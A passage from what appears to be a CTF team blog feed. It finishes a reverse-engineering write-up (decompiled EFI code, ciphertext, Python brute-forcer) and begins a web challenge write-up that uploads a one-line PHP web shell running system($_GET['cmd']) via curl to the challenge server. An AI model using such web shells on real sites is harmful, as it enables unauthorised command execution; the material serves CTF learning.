class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">efi_main</span><span class="params">(__int64 a1, __int64 a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  UINTN v2; <span class="comment">// rbx@3</span></div><div class="line">  <span class="keyword">char</span> v4[<span class="number">48</span>]; <span class="comment">// [sp+20h] [bp-A0h]@1</span></div><div class="line">  __int16 v5; <span class="comment">// [sp+48h] [bp-78h]@1</span></div><div class="line">  CHAR16 String[<span class="number">48</span>]; <span class="comment">// [sp+50h] [bp-70h]@1</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+A0h] [bp-20h]@1</span></div><div class="line">  <span class="keyword">char</span> v8; <span class="comment">// [sp+B0h] [bp-10h]@4</span></div><div class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+B8h] [bp-8h]@1</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+BCh] [bp-4h]@1</span></div><div class="line">  __int64 v11; <span class="comment">// [sp+E8h] [bp+28h]@1</span></div><div class="line"></div><div class="line">  v11 = a2;</div><div class="line">  InitializeLib();</div><div class="line">  <span class="built_in">memset</span>(String, <span class="number">0</span>, <span class="number">0x50</span>ui64);</div><div class="line">  v7 = <span class="number">0</span>;</div><div class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x28</span>ui64);</div><div class="line">  v5 = <span class="number">0</span>;</div><div class="line">  v9 = <span class="number">0</span>;</div><div class="line">  Input(<span class="string">L"Enter the flag: "</span>, String, <span class="number">42</span>i64);</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</div><div class="line">  &#123;</div><div class="line">    v2 = i;</div><div class="line">    <span class="keyword">if</span> ( v2 &gt;= StrLen(String) )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v4[i] = String[i];</div><div class="line">  &#125;</div><div class="line">  algo((__int64)v4);</div><div class="line">  (**(<span class="keyword">void</span> (__fastcall ***)(_QWORD, _QWORD))(v11 + <span class="number">48</span>))(*(_QWORD *)(v11 + <span class="number">48</span>), <span class="number">0</span>i64);</div><div class="line">  (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">signed</span> __int64, <span class="keyword">signed</span> __int64, <span class="keyword">char</span> *))(*(_QWORD *)(v11 + <span class="number">96</span>) + <span class="number">96</span>i64))(</div><div class="line">    <span class="number">1</span>i64,</div><div class="line">    *(_QWORD *)(v11 + <span class="number">48</span>) + <span class="number">16</span>i64,</div><div class="line">    &amp;v8);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</div><div class="line">&#125;</div><div class="line"></div><div class="line">UINTN __<span class="function">fastcall <span class="title">algo</span><span class="params">(__int64 a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  UINTN result; <span class="comment">// rax@17</span></div><div class="line">  <span class="keyword">int</span> v2[<span class="number">40</span>]; <span class="comment">// [sp+20h] [bp-60h]@11</span></div><div class="line">  <span class="keyword">int</span> v3[<span class="number">20</span>]; <span class="comment">// [sp+C0h] [bp+40h]@5</span></div><div class="line">  <span class="keyword">int</span> v4[<span class="number">23</span>]; <span class="comment">// [sp+110h] [bp+90h]@2</span></div><div class="line">  <span class="keyword">int</span> m; <span class="comment">// [sp+16Ch] [bp+ECh]@13</span></div><div class="line">  <span class="keyword">int</span> l; <span class="comment">// [sp+170h] [bp+F0h]@10</span></div><div class="line">  <span class="keyword">int</span> k; <span class="comment">// [sp+174h] [bp+F4h]@7</span></div><div class="line">  <span class="keyword">int</span> j; <span class="comment">// [sp+178h] [bp+F8h]@4</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+17Ch] [bp+FCh]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</div><div class="line">    v4[i] = *(_BYTE *)(i + a1);</div><div class="line">  <span class="keyword">for</span> ( j = <span class="number">20</span>; j &lt;= <span class="number">39</span>; ++j )</div><div class="line">    v3[j - <span class="number">20</span>] = *(_BYTE *)(j + a1);</div><div class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">19</span>; ++k )</div><div class="line">  &#123;</div><div class="line">    v4[k] = (((((v4[k] ^ <span class="number">0xC</span>) + <span class="number">6</span>) ^ <span class="number">0xD</span>) + <span class="number">7</span>) ^ <span class="number">0xE</span>) + <span class="number">8</span>;</div><div class="line">    v3[k] = (((((v3[k] ^ <span class="number">0xF</span>) + <span class="number">9</span>) ^ <span class="number">0x10</span>) + <span class="number">10</span>) ^ <span class="number">0x11</span>) + <span class="number">11</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">19</span>; ++l )</div><div class="line">    v2[l] = v4[l];</div><div class="line">  <span class="keyword">for</span> ( m = <span class="number">20</span>; m &lt;= <span class="number">39</span>; ++m )</div><div class="line">    v2[m] = v3[m - <span class="number">20</span>];</div><div class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">memcmp</span>((__int64)v2, (__int64)&amp;correct, <span class="number">160</span>) )</div><div class="line">    result = Print(<span class="string">L"\nWrong\n"</span>);</div><div class="line">  <span class="keyword">else</span></div><div class="line">    result = Print(<span class="string">L"\nCorrect\n"</span>);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>By reading this c code above we can clearly understand what is going on. the program itself reads from the stdout the flag and then encrypts a bunch of bytes with some xor operations and other stupid simple manipulations, since we know the ciphertext (we can get it from IDA) just double click on “correct” symbol from the main function and you will see its value in the global variables:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div></pre></td><td class="code"><pre><div class="line">.data:0000000070946000                 public correct</div><div class="line">.data:0000000070946000 correct         db  68h ; h             ; DATA XREF: algo+18Eo</div><div class="line">.data:0000000070946001                 db    0</div><div class="line">.data:0000000070946002                 db    0</div><div class="line">.data:0000000070946003                 db    0</div><div class="line">.data:0000000070946004                 db  3Ch ; &lt;</div><div class="line">.data:0000000070946005                 db    0</div><div class="line">.data:0000000070946006                 db    0</div><div class="line">.data:0000000070946007                 db    0</div><div class="line">.data:0000000070946008                 db  79h ; y</div><div class="line">.data:0000000070946009                 db    0</div><div class="line">.data:000000007094600A                 db    0</div><div class="line">.data:000000007094600B                 db    0</div><div class="line">.data:000000007094600C                 db  71h ; q</div><div class="line">.data:000000007094600D                 db    0</div><div class="line">.data:000000007094600E                 db    0</div><div class="line">.data:000000007094600F                 db    0</div><div class="line">.data:0000000070946010                 db  63h ; c</div><div class="line">.data:0000000070946011                 db    0</div><div class="line">.data:0000000070946012                 db    0</div><div class="line">.data:0000000070946013                 db    0</div><div class="line">.data:0000000070946014                 db  7Ch ; |</div><div class="line">.data:0000000070946015                 db    0</div><div class="line">.data:0000000070946016                 db    0</div><div class="line">.data:0000000070946017                 db    0</div><div class="line">.data:0000000070946018                 db  81h ; ü</div><div class="line">.data:0000000070946019                 db    0</div><div class="line">.data:000000007094601A                 db    0</div><div class="line">.data:000000007094601B                 db    0</div><div class="line">.data:000000007094601C                 db  92h ; Æ</div><div class="line">.data:000000007094601D                 db    0</div><div class="line">.data:000000007094601E                 db    0</div><div class="line">.data:000000007094601F                 db    0</div><div class="line">.data:0000000070946020                 db  92h ; Æ</div><div class="line">.data:0000000070946021                 db    0</div><div class="line">.data:0000000070946022                 db    0</div><div class="line">.data:0000000070946023                 db    0</div><div class="line">.data:0000000070946024                 db  65h ; e</div><div class="line">.data:0000000070946025                 db    0</div><div class="line">.data:0000000070946026                 db    0</div><div class="line">.data:0000000070946027                 db    0</div><div class="line">.data:0000000070946028                 db  65h ; e</div><div class="line">.data:0000000070946029                 db    0</div><div class="line">.data:000000007094602A                 db    0</div><div class="line">.data:000000007094602B                 db    0</div><div class="line">.data:000000007094602C                 db  93h ; ô</div><div class="line">.data:000000007094602D                 db    0</div><div class="line">.data:000000007094602E                 db    0</div><div class="line">.data:000000007094602F                 db    0</div><div class="line">.data:0000000070946030                 db  92h ; Æ</div><div class="line">.data:0000000070946031                 db    0</div><div class="line">.data:0000000070946032                 db    0</div><div class="line">.data:0000000070946033                 db    0</div><div class="line">.data:0000000070946034                 db  49h ; I</div><div class="line">.data:0000000070946035                 db    0</div><div class="line">.data:0000000070946036                 db    0</div><div class="line">.data:0000000070946037                 db    0</div><div class="line">.data:0000000070946038                 db  79h ; y</div><div class="line">.data:0000000070946039                 db    0</div><div class="line">.data:000000007094603A                 db    0</div><div class="line">.data:000000007094603B                 db    0</div><div class="line">.data:000000007094603C                 db  92h ; Æ</div><div class="line">.data:000000007094603D                 db    0</div><div class="line">.data:000000007094603E                 db    0</div><div class="line">.data:000000007094603F                 db    0</div><div class="line">.data:0000000070946040                 db  38h ; 8</div><div class="line">.data:0000000070946041                 db    0</div><div class="line">.data:0000000070946042                 db    0</div><div class="line">.data:0000000070946043                 db    0</div><div class="line">.data:0000000070946044                 db  6Ch ; l</div><div class="line">.data:0000000070946045                 db    0</div><div class="line">.data:0000000070946046                 db    0</div><div class="line">.data:0000000070946047                 db    0</div><div class="line">.data:0000000070946048                 db  3Ch ; &lt;</div><div class="line">.data:0000000070946049                 db    0</div><div class="line">.data:000000007094604A                 db    0</div><div class="line">.data:000000007094604B                 db    0</div><div class="line">.data:000000007094604C                 db  6Fh ; o</div><div class="line">.data:000000007094604D                 db    0</div><div class="line">.data:000000007094604E                 db    0</div><div class="line">.data:000000007094604F                 db    0</div><div class="line">.data:0000000070946050                 db  7Bh ; &#123;</div><div class="line">.data:0000000070946051                 db    0</div><div class="line">.data:0000000070946052                 db    0</div><div class="line">.data:0000000070946053                 db    0</div><div class="line">.data:0000000070946054                 db  87h ; ç</div><div class="line">.data:0000000070946055                 db    0</div><div class="line">.data:0000000070946056                 db    0</div><div class="line">.data:0000000070946057                 db    0</div><div class="line">.data:0000000070946058                 db  58h ; X</div><div class="line">.data:0000000070946059                 db    0</div><div class="line">.data:000000007094605A                 db    0</div><div class="line">.data:000000007094605B                 db    0</div><div class="line">.data:000000007094605C                 db  55h ; U</div><div class="line">.data:000000007094605D                 db    0</div><div class="line">.data:000000007094605E                 db    0</div><div class="line">.data:000000007094605F                 db    0</div><div class="line">.data:0000000070946060                 db  89h ; ë</div><div class="line">.data:0000000070946061                 db    0</div><div class="line">.data:0000000070946062                 db    0</div><div class="line">.data:0000000070946063                 db    0</div><div class="line">.data:0000000070946064                 db  5Ah ; Z</div><div class="line">.data:0000000070946065                 db    0</div><div class="line">.data:0000000070946066                 db    0</div><div class="line">.data:0000000070946067                 db    0</div><div class="line">.data:0000000070946068                 db  59h ; Y</div><div class="line">.data:0000000070946069                 db    0</div><div class="line">.data:000000007094606A                 db    0</div><div class="line">.data:000000007094606B                 db    0</div><div class="line">.data:000000007094606C                 db  7Eh ; ~</div><div class="line">.data:000000007094606D                 db    0</div><div class="line">.data:000000007094606E                 db    0</div><div class="line">.data:000000007094606F                 db    0</div><div class="line">.data:0000000070946070                 db  7Eh ; ~</div><div class="line">.data:0000000070946071                 db    0</div><div class="line">.data:0000000070946072                 db    0</div><div class="line">.data:0000000070946073                 db    0</div><div class="line">.data:0000000070946074                 db  6Bh ; k</div><div class="line">.data:0000000070946075                 db    0</div><div class="line">.data:0000000070946076                 db    0</div><div class="line">.data:0000000070946077                 db    0</div><div class="line">.data:0000000070946078                 db  87h ; ç</div><div class="line">.data:0000000070946079                 db    0</div><div class="line">.data:000000007094607A                 db    0</div><div class="line">.data:000000007094607B                 db    0</div><div class="line">.data:000000007094607C                 db  6Ch ; l</div><div class="line">.data:000000007094607D                 db    0</div><div class="line">.data:000000007094607E                 db    0</div><div class="line">.data:000000007094607F                 db    0</div><div class="line">.data:0000000070946080                 db  57h ; W</div><div class="line">.data:0000000070946081                 db    0</div><div class="line">.data:0000000070946082                 db    0</div><div class="line">.data:0000000070946083                 db    0</div><div class="line">.data:0000000070946084                 db  6Ch ; l</div><div class="line">.data:0000000070946085                 db    0</div><div class="line">.data:0000000070946086                 db    0</div><div class="line">.data:0000000070946087                 db    0</div><div class="line">.data:0000000070946088                 db  6Bh ; k</div><div class="line">.data:0000000070946089                 db    0</div><div class="line">.data:000000007094608A                 db    0</div><div class="line">.data:000000007094608B                 db    0</div><div class="line">.data:000000007094608C                 db  58h ; X</div><div class="line">.data:000000007094608D                 db    0</div><div class="line">.data:000000007094608E                 db    0</div><div class="line">.data:000000007094608F                 db    0</div><div class="line">.data:0000000070946090                 db  59h ; Y</div><div class="line">.data:0000000070946091                 db    0</div><div class="line">.data:0000000070946092                 db    0</div><div class="line">.data:0000000070946093                 db    0</div><div class="line">.data:0000000070946094                 db  5Ah ; Z</div><div class="line">.data:0000000070946095                 db    0</div><div class="line">.data:0000000070946096                 db    0</div><div class="line">.data:0000000070946097                 db    0</div><div class="line">.data:0000000070946098                 db  5Ah ; Z</div><div class="line">.data:0000000070946099                 db    0</div><div class="line">.data:000000007094609A                 db    0</div><div class="line">.data:000000007094609B                 db    0</div><div class="line">.data:000000007094609C                 db  6Fh ; o</div><div class="line">.data:000000007094609D                 db    0</div><div class="line">.data:000000007094609E                 db    0</div><div class="line">.data:000000007094609F                 db    0</div></pre></td></tr></table></figure>
<p>Now parsing it with sublime-txt(very fast and easy to do it), than we put into a hex byte characters string in python… why not put the characters since ida actually shows some of them? Because this is a ciphertext and some characters may be unprintable or those which can be printed may require unicode and we all know how boring is to deal with unicode in python …  so I always use hex bytes.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">correct = <span class="string">"\x68\x3C\x79\x71\x63\x7C\x81\x92\x92\x65\x65\x93\x92\x49\x79\x92\x38\x6C\x3C\x6F\x7B\x87\x58\x55\x89\x5A\x59\x7E\x7E\x6B\x87\x6C\x57\x6C\x6B\x58\x59\x5A\x5A\x6F"</span></div></pre></td></tr></table></figure>
<p>Now I have an idea instead of trying to make a function that reverses those two functions why not bruteforce byte by byte, replicate the pseudo c code in python and when we get the final ciphertext equal to the “correct” variable we end the calculations and print the original string? seems like a cool plan! so we just rewrite that c code into python and then we add some loops to bruteforce the rest of the flag!!!</p>
<p>We don’t even need to bruteforce from the range from 0x00 to the 0xff we can just use printable characters since the flag will only have those! and more we already have the beginning and the end of the flag which is “h4ck1t{“ and “}”.</p>
<p>Here is the final payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</div><div class="line"><span class="keyword">import</span> difflib</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">from</span> difflib <span class="keyword">import</span> Differ</div><div class="line"></div><div class="line"></div><div class="line">correct = <span class="string">"\x68\x3C\x79\x71\x63\x7C\x81\x92\x92\x65\x65\x93\x92\x49\x79\x92\x38\x6C\x3C\x6F\x7B\x87\x58\x55\x89\x5A\x59\x7E\x7E\x6B\x87\x6C\x57\x6C\x6B\x58\x59\x5A\x5A\x6F"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">algo</span><span class="params">(a1, offset)</span>:</span></div><div class="line">  result = <span class="string">""</span></div><div class="line">  v2 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</div><div class="line">  v3 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</div><div class="line">  v4 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</div><div class="line">  </div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">20</span>):</div><div class="line">    v4[i] = ord(a1[i])</div><div class="line"></div><div class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">20</span>,<span class="number">40</span>):</div><div class="line">    v3[j<span class="number">-20</span>]= ord(a1[j]) </div><div class="line"></div><div class="line">  <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">20</span>):</div><div class="line">    v4[k] = (((((v4[k] ^ <span class="number">0xC</span>) + <span class="number">6</span>) ^ <span class="number">0xD</span>) + <span class="number">7</span>) ^ <span class="number">0xE</span>) + <span class="number">8</span></div><div class="line">    v3[k] = (((((v3[k] ^ <span class="number">0xF</span>) + <span class="number">9</span>) ^ <span class="number">0x10</span>) + <span class="number">10</span>) ^ <span class="number">0x11</span>) + <span class="number">11</span></div><div class="line">  <span class="keyword">for</span> l <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">20</span>):</div><div class="line">    v2[l] = v4[l]</div><div class="line">  <span class="keyword">for</span> m <span class="keyword">in</span> xrange(<span class="number">20</span>,<span class="number">40</span>):</div><div class="line">    v2[m] = v3[m<span class="number">-20</span>]</div><div class="line">  flag = <span class="string">''</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> v2])</div><div class="line">  <span class="comment">#print(flag)</span></div><div class="line">  <span class="comment">#print(correct)</span></div><div class="line">  </div><div class="line">  <span class="keyword">if</span>(flag != correct):</div><div class="line">    result = <span class="string">"Wrong"</span></div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    result = <span class="string">"Correct"</span></div><div class="line">  <span class="keyword">return</span> result, flag[offset] == correct[offset]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">  v2 = <span class="number">0</span></div><div class="line">  v4 = <span class="string">""</span></div><div class="line">  flag = <span class="string">""</span> <span class="comment"># 0x20</span></div><div class="line">  v6 = <span class="string">''</span></div><div class="line">  v7 = <span class="number">0</span></div><div class="line">  i = <span class="number">0</span></div><div class="line">  result = <span class="string">'Wrong'</span></div><div class="line">  offset = <span class="number">7</span></div><div class="line">  flag = <span class="string">"h4ck1t&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;"</span></div><div class="line">  diff = <span class="keyword">False</span></div><div class="line">  <span class="comment">#print (string.printable)</span></div><div class="line">  <span class="comment">#exit(0)</span></div><div class="line">  <span class="keyword">while</span> result == <span class="string">'Wrong'</span>:</div><div class="line">    <span class="comment">#print offset</span></div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> string.printable:  </div><div class="line">      v4 = <span class="string">""</span></div><div class="line">      flag = [x <span class="keyword">for</span> x <span class="keyword">in</span> flag]</div><div class="line">      <span class="comment">#print offset</span></div><div class="line">      flag[offset] = y</div><div class="line">      <span class="comment">#print('\r'+''.join(flag),end='')</span></div><div class="line">      i = <span class="number">0</span></div><div class="line">      <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        v2 = i</div><div class="line">        <span class="keyword">if</span> (v2 &gt;= len(flag)):</div><div class="line">          <span class="keyword">break</span></div><div class="line">        v4 += flag[i]</div><div class="line">        i +=<span class="number">1</span></div><div class="line">      <span class="comment">#print (v4,offset)</span></div><div class="line">      result, diff = algo(v4, offset)</div><div class="line">      <span class="keyword">if</span> result == <span class="string">'Correct'</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line">      <span class="comment">#print (diff,y)</span></div><div class="line">      <span class="comment">#print len(list(diff))</span></div><div class="line">      <span class="keyword">if</span> diff:</div><div class="line">        diff = <span class="keyword">False</span></div><div class="line">        offset += <span class="number">1</span></div><div class="line">        <span class="keyword">break</span></div><div class="line">  print(<span class="string">''</span>.join(flag), result)</div><div class="line">main()</div></pre></td></tr></table></figure></p>
<p>Easy isn’t it? running it we get the flag!:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python rev200.py</div><div class="line">h4ck1t&#123;ff77af3cf8d4e1e67c4300aeb5ba6344&#125; Correct</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;rev200&lt;br&gt;&lt;br&gt;Description: You haxor, come on you little sciddie… debug me, eh? You fucking little lamer… You fuckin’ come o
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="bruteforce" scheme="https://teamrocketist.github.io/tags/bruteforce/"/>
    
      <category term="encryption" scheme="https://teamrocketist.github.io/tags/encryption/"/>
    
      <category term="byte2byte" scheme="https://teamrocketist.github.io/tags/byte2byte/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Hackit 2017 - V1rus3pidem1c 100</title>
    <link href="https://teamrocketist.github.io/2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/"/>
    <id>https://teamrocketist.github.io/2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/</id>
    <published>2017-08-27T14:42:12.000Z</published>
    <updated>2017-08-27T20:18:33.098Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>V1rus3pidem1c<br>web100<br><br>Wasted<br><br>16<br><br>Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!<br><br>Attachment: (none)<br><br>Webpage: <a href="http://tasks.ctf.com.ua:13372" target="_blank" rel="external">http://tasks.ctf.com.ua:13372</a><br>Hint: (none)<br></blockquote>

<p>After interacting a little bit with the page we can start taking some notes about the website:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">GET parameter &quot;Country&quot; (Possible attacks like SQLi, LFI or even bash injection).</div><div class="line">File Upload form (By uploading a PHP Script).  </div><div class="line">The uploaded files appear to be uploaded into uploads folder.</div></pre></td></tr></table></figure></p>
<p>Lets try uploading a php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">&lt;pre&gt;<span class="keyword">if</span>($_GET[<span class="string">'cmd'</span>])&#123;system($_GET[<span class="string">'cmd'</span>]);&#125;&lt;/pre&gt;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>Running some curl commands to check the status code of the file we are about to upload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --write-out <span class="string">'%&#123;http_code&#125;'</span> --silent --output /dev/null <span class="string">'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'</span></div><div class="line">404</div></pre></td></tr></table></figure>
<p>We got a 404 (not found) which is normal we still didn’t upload our php file so lets do it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --write-out <span class="string">'%&#123;http_code&#125;'</span> --silent --output /dev/null <span class="string">'http://tasks.ctf.com.ua:13372/index.php?country=Germany'</span> -F <span class="string">"fileToUpload=@/home/teamrocketist/D/H/dnjefwh43jfh342fnewjfjndewefnu27fd.php"</span></div><div class="line">200</div></pre></td></tr></table></figure>
<p>Nice we got an 200 (OK) response! lets see if see if this is good news:</p>
